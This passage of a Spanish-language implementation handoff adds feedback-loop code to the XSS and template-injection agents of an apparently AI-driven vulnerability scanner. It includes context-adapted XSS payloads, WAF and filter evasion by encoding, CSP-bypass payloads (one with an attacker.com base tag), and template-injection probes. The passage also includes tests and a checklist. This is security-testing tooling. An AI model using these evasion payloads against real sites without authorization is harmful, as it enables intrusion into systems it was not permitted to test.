                variant = llm_result.get('payload')
                method = "llm_fallback"
        
        # Verificar que la variante sea diferente al original y no ya probada
        if variant and variant != original and not feedback.was_variant_tried(variant):
            self.logger.info(f"[XSSAgent] Generated variant via {method}: {variant[:60]}...")
            return {
                "payload": variant,
                "method": method,
                "parent_payload": original,
                "adaptation_reason": feedback.failure_reason.value
            }
        
        self.logger.warning("[XSSAgent] Could not generate unique variant")
        return None

    def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
        """
        Adapta un payload al contexto HTML detectado.
        
        Args:
            payload: Payload original
            context: Contexto detectado ('script', 'attribute', 'html', etc.)
            
        Returns:
            Payload adaptado al contexto
        """
        # Extraer la parte de ejecución del payload
        js_code = payload
        js_code = js_code.replace('<script>', '').replace('</script>', '')
        js_code = js_code.replace('<img src=x onerror=', '').replace('>', '')
        if not js_code:
            js_code = 'alert(1)'
        
        if context == 'attribute':
            # Estamos dentro de un atributo HTML
            return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'
        
        elif context == 'script':
            # Estamos dentro de un bloque <script>
            return f"';{js_code};//"
        
        elif context == 'html':
            # Estamos en HTML normal - usar evento handler
            return f'<img src=x onerror={js_code}>'
        
        elif context == 'comment':
            # Estamos dentro de un comentario HTML
            return f'--><script>{js_code}</script><!--'
        
        elif context == 'style':
            # Estamos dentro de un bloque <style>
            return f'</style><script>{js_code}</script><style>'
        
        # Por defecto, devolver un payload seguro
        return f'<img src=x onerror={js_code}>'

    def _encode_stripped_chars(self, payload: str, stripped: List[str]) -> str:
        """
        Codifica los caracteres que fueron filtrados por el servidor.
        
        Args:
            payload: Payload original
            stripped: Lista de caracteres que fueron filtrados
            
        Returns:
            Payload con los caracteres codificados
        """
        result = payload
        
        # Mapeo de caracteres a diferentes encodings
        encoding_options = {
            '<': ['&lt;', '\\x3c', '\\u003c', '%3C'],
            '>': ['&gt;', '\\x3e', '\\u003e', '%3E'],
            '"': ['&quot;', '\\x22', '\\u0022', '%22'],
            "'": ['&#39;', '\\x27', '\\u0027', '%27'],
            '(': ['&#40;', '\\x28', '\\u0028', '%28'],
            ')': ['&#41;', '\\x29', '\\u0029', '%29'],
            '/': ['&#47;', '\\x2f', '\\u002f', '%2F'],
            '\\': ['&#92;', '\\x5c', '\\u005c', '%5C'],
            '=': ['&#61;', '\\x3d', '\\u003d', '%3D']
        }
        
        for char in stripped:
            if char in encoding_options:
                # Usar el primer encoding disponible
                encoded = encoding_options[char][0]
                result = result.replace(char, encoded)
        
        return result

    def _generate_csp_bypass_payload(self) -> str:
        """
        Genera un payload que intenta bypassear CSP.
        
        Returns:
            Payload diseñado para evadir CSP
        """
        csp_bypass_payloads = [
            # Usar 'nonce' si está disponible
            '<script nonce="">alert(1)</script>',
            # Base tag injection
            '<base href="https://attacker.com/">',
            # JSONP callback
            '<script src="/api/callback?cb=alert(1)"></script>',
            # Angular sandbox escape
            '{{constructor.constructor("alert(1)")()}}',
            # Trusted Types bypass
            '<div data-trusted="<img src=x onerror=alert(1)>"></div>',
            # Object/embed bypass
            '<object data="javascript:alert(1)">',
        ]
        
        # Devolver el primero (en una implementación más avanzada, tendría más lógica)
        return csp_bypass_payloads[0]
```

### 5.4 Verificación

```bash
python3 -m py_compile /home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/agents/xss_agent.py
```

---

## 6. MODIFICAR: csti_agent.py

### 6.1 Ubicación Exacta

**Ruta completa:** `/home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/agents/csti_agent.py`

### 6.2 PASO 1: Añadir Import

```python
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
```

### 6.3 PASO 2: Añadir Método handle_validation_feedback

**Buscar el final de la clase CSTIAgent.**

**Añadir:**

```python
    async def handle_validation_feedback(
        self, 
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante de CSTI.
        
        Args:
            feedback: Información sobre el fallo de validación
            
        Returns:
            Diccionario con el nuevo payload, o None
        """
        self.logger.info(
            f"[CSTIAgent] Received feedback: {feedback.failure_reason.value}"
        )
        
        original = feedback.original_payload
        variant = None
        method = "feedback_adaptation"
        
        # Detectar el motor de plantillas del payload original
        engine = self._detect_engine_from_payload(original)
        
        if feedback.failure_reason == FailureReason.WAF_BLOCKED:
            # Usar encoding
            encoded = await self._get_encoded_payloads([original])
            if encoded and encoded[0] != original:
                variant = encoded[0]
                method = "waf_bypass"
        
        elif feedback.failure_reason == FailureReason.CONTEXT_MISMATCH:
            # Probar con otro motor
            variant = self._try_alternative_engine(engine)
            method = "engine_switch"
        
        elif feedback.failure_reason == FailureReason.ENCODING_STRIPPED:
            # Usar sintaxis alternativa
            variant = self._encode_template_chars(original, feedback.stripped_chars)
            method = "char_encoding"
        
        # Fallback a LLM
        if not variant or variant == original:
            llm_result = await self._llm_probe(None, feedback.parameter)
            if llm_result:
                variant = llm_result.get('payload')
                method = "llm_fallback"
        
        if variant and variant != original and not feedback.was_variant_tried(variant):
            return {
                "payload": variant,
                "method": method,
                "engine_guess": engine
            }
        
        return None

    def _detect_engine_from_payload(self, payload: str) -> str:
        """Detecta el motor de plantillas basándose en la sintaxis."""
        if '{{' in payload and '}}' in payload:
            if '__class__' in payload or 'config' in payload:
                return 'jinja2'
            return 'twig'
        elif '${' in payload:
            return 'freemarker'
        elif '#set' in payload or '$!' in payload:
            return 'velocity'
        elif '{%' in payload:
            return 'jinja2'
        return 'unknown'

    def _try_alternative_engine(self, current_engine: str) -> str:
        """Devuelve un payload para un motor diferente."""
        payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '${7*7}',
            'velocity': '#set($x=7*7)$x',
            'pebble': '{{7*7}}',
            'thymeleaf': '[[${7*7}]]'
        }
        
        # Elegir uno diferente al actual
        for engine, payload in payloads.items():
            if engine != current_engine:
                return payload
        
        return '{{7*7}}'

    def _encode_template_chars(self, payload: str, stripped: List[str]) -> str:
        """Codifica caracteres filtrados en sintaxis de plantilla."""
        result = payload
        
        # Si filtraron llaves, probar con otras sintaxis
        if '{' in stripped or '}' in stripped:
            # Cambiar de {{ a ${
            result = result.replace('{{', '${').replace('}}', '}')
        
        # URL encoding para otros caracteres
        for char in stripped:
            if char not in '{}':
                result = result.replace(char, f'%{ord(char):02X}')
        
        return result
```

---

## 7. PRUEBA DE INTEGRACIÓN

### 7.1 Crear Script de Test

**Crear archivo:** `/home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/testing/test_feedback_loop.py`

```python
"""
Test de integración para el feedback loop.
Ejecutar con: python -m pytest testing/test_feedback_loop.py -v
"""

import pytest
import asyncio
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason


def test_validation_feedback_creation():
    """Test básico de creación de ValidationFeedback."""
    feedback = ValidationFeedback(
        finding_id=1,
        original_payload="<script>alert(1)</script>",
        url="http://example.com",
        parameter="q",
        vuln_type="XSS",
        failure_reason=FailureReason.WAF_BLOCKED
    )
    
    assert feedback.finding_id == 1
    assert feedback.can_retry() == True
    assert feedback.failure_reason == FailureReason.WAF_BLOCKED


def test_retry_limit():
    """Test que el límite de reintentos funciona."""
    feedback = ValidationFeedback(
        finding_id=1,
        original_payload="test",
        url="http://example.com",
        parameter="q",
        vuln_type="XSS",
        retry_count=3,  # Ya alcanzó el límite
        max_retries=3
    )
    
    assert feedback.can_retry() == False


def test_variant_tracking():
    """Test que el tracking de variantes funciona."""
    feedback = ValidationFeedback(
        finding_id=1,
        original_payload="test",
        url="http://example.com",
        parameter="q",
        vuln_type="XSS"
    )
    
    variant = "<img src=x onerror=alert(1)>"
    assert feedback.was_variant_tried(variant) == False
    
    feedback.add_tried_variant(variant)
    assert feedback.was_variant_tried(variant) == True


def test_to_dict_serialization():
    """Test que la serialización funciona."""
    feedback = ValidationFeedback(
        finding_id=42,
        original_payload="payload",
        url="http://test.com",
        parameter="p",
        vuln_type="XSS",
        failure_reason=FailureReason.CSP_BLOCKED,
        csp_violation="Refused to execute inline script"
    )
    
    data = feedback.to_dict()
    
    assert data["finding_id"] == 42
    assert data["failure_reason"] == "csp_blocked"
    assert "Refused" in data["csp_violation"]


def test_adaptation_hint():
    """Test que las pistas de adaptación funcionan."""
    feedback = ValidationFeedback(
        finding_id=1,
        original_payload="test",
        url="http://example.com",
        parameter="q",
        vuln_type="XSS",
        failure_reason=FailureReason.ENCODING_STRIPPED,
        stripped_chars=['<', '>']
    )
    
    hint = feedback.get_adaptation_hint()
    assert '<' in hint or 'filtrados' in hint.lower() or 'stripped' in hint.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
```

### 7.2 Ejecutar Tests

```bash
cd /home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI
python -m pytest testing/test_feedback_loop.py -v
```

**Resultado esperado:** Todos los tests deben pasar (5 tests).

---

## 8. VERIFICACIÓN FINAL

### 8.1 Checklist de Verificación

Ejecuta estos comandos uno por uno:

```bash
# 1. Verificar que validation_feedback.py existe y no tiene errores
python3 -c "from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason; print('✓ validation_feedback.py OK')"

# 2. Verificar que agentic_validator.py no tiene errores de sintaxis
python3 -m py_compile bugtrace/agents/agentic_validator.py && echo "✓ agentic_validator.py OK"

# 3. Verificar que xss_agent.py no tiene errores de sintaxis  
python3 -m py_compile bugtrace/agents/xss_agent.py && echo "✓ xss_agent.py OK"

# 4. Verificar que csti_agent.py no tiene errores de sintaxis
python3 -m py_compile bugtrace/agents/csti_agent.py && echo "✓ csti_agent.py OK"

# 5. Ejecutar los tests
python -m pytest testing/test_feedback_loop.py -v
```

### 8.2 Si Hay Errores

1. **Error de import:** Verifica que el archivo `validation_feedback.py` está en la ruta correcta
2. **Error de sintaxis:** Revisa que no haya indentación incorrecta o caracteres extraños
3. **Error de atributo:** Verifica que añadiste las variables en `__init__`

---

## 9. RESUMEN DE ARCHIVOS MODIFICADOS

| Archivo | Acción | Cambios |
|---------|--------|---------|
| `bugtrace/schemas/validation_feedback.py` | **CREAR** | Nuevo archivo con ValidationFeedback y FailureReason |
| `bugtrace/agents/agentic_validator.py` | **MODIFICAR** | Añadir import, atributos en __init__, 4 nuevos métodos |
| `bugtrace/agents/xss_agent.py` | **MODIFICAR** | Añadir import, 4 nuevos métodos |
| `bugtrace/agents/csti_agent.py` | **MODIFICAR** | Añadir import, 4 nuevos métodos |
| `testing/test_feedback_loop.py` | **CREAR** | Nuevo archivo de tests |

---

## 10. ORDEN DE IMPLEMENTACIÓN (SIGUE ESTE ORDEN EXACTO)

1. ☐ **CREAR** `bugtrace/schemas/validation_feedback.py` (Sección 3)
2. ☐ **VERIFICAR** que el archivo se importa correctamente
3. ☐ **MODIFICAR** `agentic_validator.py` - añadir import (Sección 4.2)
4. ☐ **MODIFICAR** `agentic_validator.py` - añadir atributos en __init__ (Sección 4.3)
5. ☐ **MODIFICAR** `agentic_validator.py` - añadir `_generate_feedback` (Sección 4.4)
6. ☐ **MODIFICAR** `agentic_validator.py` - añadir `_request_payload_variant`, `_get_xss_variant`, `_get_csti_variant` (Sección 4.5)
7. ☐ **MODIFICAR** `agentic_validator.py` - añadir lógica en `validate_finding_agentically` (Sección 4.6)
8. ☐ **VERIFICAR** que `agentic_validator.py` compila
9. ☐ **MODIFICAR** `xss_agent.py` - añadir import y métodos (Sección 5)
10. ☐ **VERIFICAR** que `xss_agent.py` compila
11. ☐ **MODIFICAR** `csti_agent.py` - añadir import y métodos (Sección 6)
12. ☐ **VERIFICAR** que `csti_agent.py` compila
13. ☐ **CREAR** `testing/test_feedback_loop.py` (Sección 7)
14. ☐ **EJECUTAR** tests y verificar que pasan
15. ☐ **PROBAR** con un escaneo real en el Dojo local

---

**FIN DEL HANDOFF - Implementa paso a paso y verifica cada cambio antes de continuar**
